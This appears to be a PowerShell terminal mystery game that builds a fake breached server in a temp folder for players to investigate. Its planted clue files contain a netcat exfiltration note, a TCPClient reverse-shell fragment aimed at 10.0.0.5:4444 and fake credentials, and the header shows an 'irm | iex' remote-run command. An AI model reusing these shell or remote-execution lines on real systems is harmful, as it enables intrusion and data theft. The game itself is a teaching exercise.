# ============================================================================
# MaddixSuite — https://github.com/mohammadmehrani/MaddixSuite
# Author: Mohammad Mehrani (Maddix) — https://iodeck.ir
# ============================================================================
# Maddix-Mystery.ps1 — Terminal Puzzle Game (inspired by titap_mystry)
# A PowerShell-based mystery/puzzle game where you explore a virtual
# filesystem and solve clues using command-line commands.
# Run: irm https://raw.githubusercontent.com/mohammadmehrani/MaddixSuite/main/windows/Maddix-Mystery.ps1 | iex

$Host.UI.RawUI.WindowTitle = "Maddix — Terminal Mystery"
$script:GameDir = "$env:TEMP\MaddixMystery_$(Get-Random -Maximum 99999)"
$script:Score = 0
$script:Level = 0
$script:FoundClues = @()

function Write-Color { param([string]$Text, [string]$Color = "White") Write-Host $Text -ForegroundColor $Color }

function Show-Banner {
    Clear-Host
    Write-Color "╔═══════════════════════════════════════════════════════════╗" "Cyan"
    Write-Color "║   ███╗   ███╗██╗   ██╗███████╗████████╗███████╗██████╗  ║" "Cyan"
    Write-Color "║   ████╗ ████║╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗ ║" "Cyan"
    Write-Color "║   ██╔████╔██║ ╚████╔╝ █████╗     ██║   █████╗  ██████╔╝ ║" "Cyan"
    Write-Color "║   ██║╚██╔╝██║  ╚██╔╝  ██╔══╝     ██║   ██╔══╝  ██╔══██╗ ║" "Cyan"
    Write-Color "║   ██║ ╚═╝ ██║   ██║   ███████╗   ██║   ███████╗██║  ██║ ║" "Cyan"
    Write-Color "║   ╚═╝     ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ║" "Cyan"
    Write-Color "║            TERMINAL MYSTERY — Find the Truth               ║" "Cyan"
    Write-Color "╚═══════════════════════════════════════════════════════════╝" "Cyan"
    Write-Color ""
    Write-Color "  A mysterious server has been compromised. Hidden clues" "Gray"
    Write-Color "  are scattered across the filesystem. Find all 5 clues" "Gray"
    Write-Color "  to uncover the truth and restore the system." "Gray"
    Write-Color ""
    Write-Color "  Commands: ls, cd, cat, type, dir, get-content, find, help" "Yellow"
    Write-Color "  Type 'help' for hints | 'clues' to see what you found" "Yellow"
    Write-Color "  Type 'quit' to exit" "Red"
    Write-Color ""
}

function Build-World {
    New-Item -ItemType Directory -Path "$script:GameDir" -Force | Out-Null

    # Create directory structure
    $dirs = @(
        "$script:GameDir\etc",
        "$script:GameDir\var\log",
        "$script:GameDir\home\admin",
        "$script:GameDir\home\admin\.ssh",
        "$script:GameDir\opt\backup",
        "$script:GameDir\tmp",
        "$script:GameDir\usr\share",
        "$script:GameDir\mnt\backup"
    )
    foreach ($d in $dirs) { New-Item -ItemType Directory -Path $d -Force | Out-Null }

    # Create decoy files
    Set-Content "$script:GameDir\etc\hosts" "127.0.0.1 localhost`n192.168.1.100 server.internal"
    Set-Content "$script:GameDir\var\log\syslog" "Jul 2 10:00:00 server sshd[1234]: Failed password for root from 10.0.0.5 port 2222"
    Set-Content "$script:GameDir\var\log\syslog" -Value (Get-Content "$script:GameDir\var\log\syslog") -NoNewline
    Add-Content "$script:GameDir\var\log\syslog" "`nJul 2 10:01:00 server sshd[1235]: Connection closed by 10.0.0.5"
    Add-Content "$script:GameDir\var\log\syslog" "`nJul 2 10:02:00 server su[1240]: FAILED SU (to root) for admin from 10.0.0.5"
    Add-Content "$script:GameDir\var\log\access.log" "192.168.1.1 - - [02/Jul/2026:08:00:00] GET /admin HTTP/1.1 403"
    Add-Content "$script:GameDir\var\log\access.log" "10.0.0.5 - - [02/Jul/2026:09:00:00] GET /admin/panel HTTP/1.1 200"
    Add-Content "$script:GameDir\var\log\access.log" "10.0.0.5 - - [02/Jul/2026:09:01:00] POST /admin/panel/upload HTTP/1.1 200"

    # CLUE 1: In the SSH directory
    Set-Content "$script:GameDir\home\admin\.ssh\authorized_keys" "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4HackerKeyHere... kali@attacker"

    # CLUE 2: In the backup directory
    Set-Content "$script:GameDir\opt\backup\notes.txt" "Backup plan: exfiltrate /etc/shadow to 10.0.0.5:4444 via nc"
    Set-Content "$script:GameDir\opt\backup\script.ps1" '# Malicious script
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.5",4444)
$stream = $client.GetStream()
# Hidden backdoor established'

    # CLUE 3: Hidden in tmp
    Set-Content "$script:GameDir\tmp\.hidden" "Clue3: Attacker IP is 10.0.0.5 - They gained access via stolen SSH key"

    # CLUE 4: In the mounted backup
    Set-Content "$script:GameDir\mnt\backup\shadow_copy" "admin:`$6`$salt`$hash:18000:0:99999:7:::"
    Set-Content "$script:GameDir\mnt\backup\cracked.txt" "Clue4: Password hash cracked - admin:Password123! - Change immediately"

    # CLUE 5: Final - in usr/share
    Set-Content "$script:GameDir\usr\share\readme.txt" "Clue5: CONGRATULATIONS! You found all clues.
The attacker (10.0.0.5) compromised the system via:
1. Stolen SSH key in /home/admin/.ssh/authorized_keys
2. Exfiltrated /etc/shadow to their server
3. Uploaded a backdoor script via web panel
4. Changed admin password

Actions needed:
- Remove unauthorized SSH key
- Block IP 10.0.0.5 at firewall
- Change ALL passwords
- Remove backdoor scripts
- Enable SSH key-only auth with 2FA
- Audit /var/log for further compromise

Thanks for playing - MaddixSuite"
}

function Show-Clues {
    Write-Color "`n  ─── CLUES FOUND: $($script:FoundClues.Count)/5 ───" "Cyan"
    if ($script:FoundClues.Count -eq 0) {
        Write-Color "  No clues yet. Keep exploring!" "Yellow"
    } else {
        $i = 1
        foreach ($c in $script:FoundClues) {
            Write-Color "  Clue $i: $c" "Green"
            $i++
        }
    }
    if ($script:FoundClues.Count -ge 5) {
        Write-Color "`n  ╔══════════════════════════════════════╗" "Green"
        Write-Color "  ║   ALL CLUES FOUND - YOU WIN!         ║" "Green"
        Write-Color "  ╚══════════════════════════════════════╝" "Green"
        Write-Color "`n  Read the final clue for the full story." "Yellow"
        Write-Color "  Score: $script:Score points" "Cyan"
    }
    Write-Color ""
}

function Check-Clue {
    param([string]$Path)
    if ($Path -match '\.hidden' -and -not ($script:FoundClues -contains "Hidden file in tmp")) {
        $script:FoundClues += "Hidden file in tmp"
        $script:Score += 20
        Write-Color "  [+] CLUE FOUND! (+20 points)" "Green"
        return
    }
    if ($Path -match 'authorized_keys' -and -not ($script:FoundClues -contains "SSH key backdoor")) {
        $script:FoundClues += "SSH key backdoor"
        $script:Score += 20
        Write-Color "  [+] CLUE FOUND! (+20 points)" "Green"
        return
    }
    if ($Path -match 'notes\.txt' -and -not ($script:FoundClues -contains "Exfiltration plan")) {
        $script:FoundClues += "Exfiltration plan"
        $script:Score += 20
        Write-Color "  [+] CLUE FOUND! (+20 points)" "Green"
        return
    }
    if ($Path -match 'cracked\.txt' -and -not ($script:FoundClues -contains "Cracked password")) {
        $script:FoundClues += "Cracked password"
        $script:Score += 20
        Write-Color "  [+] CLUE FOUND! (+20 points)" "Green"
        return
    }
    if ($Path -match 'readme\.txt' -and -not ($script:FoundClues -contains "Final revelation")) {
        $script:FoundClues += "Final revelation"
        $script:Score += 20
        Write-Color "  [+] FINAL CLUE FOUND! (+20 points)" "Green"
        return
    }
}

function Show-Help {
    Write-Color "`n  ─── HELP ───" "Cyan"
    Write-Color "  This is a mystery game. Explore the virtual filesystem" "Gray"
    Write-Color "  using real PowerShell commands:" "Gray"
    Write-Color ""
    Write-Color "  ls, dir        List files in current directory" "White"
    Write-Color "  cd <path>      Change directory" "White"
    Write-Color "  cat, type, gc  Read file contents" "White"
    Write-Color "  find, where    Search for files" "White"
    Write-Color "  pwd, gl        Show current directory" "White"
    Write-Color "  clues          Show found clues" "White"
    Write-Color "  help           This screen" "White"
    Write-Color "  reset          Restart the game" "White"
    Write-Color "  quit           Exit" "White"
    Write-Color ""
    Write-Color "  TIP: Look everywhere! Check hidden files," "Yellow"
    Write-Color "  log files, config files, and backups." "Yellow"
    Write-Color "  Use: ls -Force to see hidden files" "Yellow"
    Write-Color ""
}

function Invoke-Mystery {
    Show-Banner
    Write-Color "  Press Enter to begin your investigation..." "Yellow"
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") 2>$null

    Build-World
    $script:CurrentPath = "root"
    $script:PSPath = $script:GameDir

    Write-Color "`n  Initializing virtual filesystem..." "Gray"
    Start-Sleep -Milliseconds 500
    Write-Color "  You are in the root of a compromised server." "White"
    Write-Color "  Find evidence of the breach. Type 'help' if stuck.`n" "Yellow"

    while ($true) {
        Write-Color "`n  ═══ $script:CurrentPath ═══" "DarkGray"
        $cmd = (Read-Host "  >").Trim()

        if ($cmd -eq 'quit' -or $cmd -eq 'exit') {
            Write-Color "  Investigation terminated. Score: $script:Score" "Yellow"
            break
        }
        elseif ($cmd -eq 'help') { Show-Help }
        elseif ($cmd -eq 'clues') { Show-Clues }
        elseif ($cmd -eq 'reset') {
            Remove-Item -Path $script:GameDir -Recurse -Force -ErrorAction SilentlyContinue
            $script:FoundClues = @()
            $script:Score = 0
            $script:CurrentPath = "root"
            $script:PSPath = $script:GameDir
            Build-World
            Write-Color "  Game reset. New investigation begins." "Green"
        }
        elseif ($cmd -eq 'pwd' -or $cmd -eq 'gl') {
            Write-Color "  $script:PSPath" "Gray"
        }
        elseif ($cmd -match '^ls\s*(.*)$' -or $cmd -match '^dir\s*(.*)$') {
            $a = $matches[1].Trim()
            $showHidden = $a -match '-Force|-Hidden|-fo|-hi'
            try {
                $items = if ($showHidden) { Get-ChildItem $script:PSPath -Force -ErrorAction Stop }
                         else { Get-ChildItem $script:PSPath -ErrorAction Stop }
                if (-not $items) { Write-Color "  (empty)" "Gray" }
                else {
                    foreach ($item in $items) {
                        $color = if ($item.PSIsContainer) { "Cyan" } else { "White" }
                        $hidden = if ($item.Attributes -band [System.IO.FileAttributes]::Hidden) { " (hidden)" } else { "" }
                        $size = if (-not $item.PSIsContainer) { " [$([math]::Round($item.Length/1KB,1)) KB]" } else { "" }
                        Write-Color "  $($item.Name)$hidden$size" $color
                    }
                }
            } catch { Write-Color "  Path not found." "Red" }
        }
        elseif ($cmd -match '^cd\s+(.+)$') {
            $target = $matches[1].Trim()
            if ($target -eq '..') {
                $parent = Split-Path $script:PSPath -Parent
                if ($parent -and $parent -ne $script:GameDir) { $script:PSPath = $parent } else { $script:PSPath = $script:GameDir }
            } elseif ($target -eq '/') {
                $script:PSPath = $script:GameDir
            } else {
                $newPath = if ($target -match '^[/\\]') { Join-Path $script:GameDir $target.TrimStart('/').TrimStart('\') } else { Join-Path $script:PSPath $target }
                if (Test-Path $newPath -PathType Container) { $script:PSPath = $newPath } else { Write-Color "  Directory not found." "Red"; continue }
            }
            $relative = $script:PSPath.Substring($script:GameDir.Length).Replace('\','/').Trim('/')
            $script:CurrentPath = if ($relative) { "/$relative" } else { "root" }
        }
        elseif ($cmd -match '^(cat|type|gc)\s+(.+)$') {
            $target = $matches[2].Trim()
            $fullPath = if ($target -match '^[/\\]') { Join-Path $script:GameDir $target.TrimStart('/').TrimStart('\') } else { Join-Path $script:PSPath $target }
            if (Test-Path $fullPath -PathType Leaf) {
                $content = Get-Content $fullPath -Raw -ErrorAction SilentlyContinue
                if ($content) { Write-Color "$content" "Gray" }
                Check-Clue -Path $fullPath
                Show-Clues
            } else { Write-Color "  File not found." "Red" }
        }
        elseif ($cmd -match '^(find|where)\s+(.+)$') {
            $pattern = $matches[2].Trim().Trim('"').Trim("'")
            try {
                $results = Get-ChildItem $script:PSPath -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*$pattern*" }
                if ($results) { $results | ForEach-Object { Write-Color "  $($_.FullName.Replace($script:GameDir,'').Replace('\','/'))" "Gray" } }
                else { Write-Color "  No matches." "Gray" }
            } catch { Write-Color "  Search error." "Red" }
        }
        else {
            Write-Color "  Unknown command. Type 'help' for available commands." "Yellow"
        }

        if ($script:FoundClues.Count -ge 5) {
            Write-Color "`n  ╔══════════════════════════════════════╗" "Green"
            Write-Color "  ║   INVESTIGATION COMPLETE! YOU WIN!   ║" "Green"
            Write-Color "  ║   Score: $($script:Score) / 100                ║" "Green"
            Write-Color "  ╚══════════════════════════════════════╝" "Green"
            Write-Color "`n  Press any key to restart or type 'quit'." "Yellow"
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") 2>$null
        }
    }
}

function Start-Mystery {
    param([switch]$TestMode)
    if ($TestMode) {
        Build-World
        return
    }
    Invoke-Mystery
    Remove-Item -Path $script:GameDir -Recurse -Force -ErrorAction SilentlyContinue
}

if ($MyInvocation.InvocationName -ne '.') {
    Start-Mystery
}
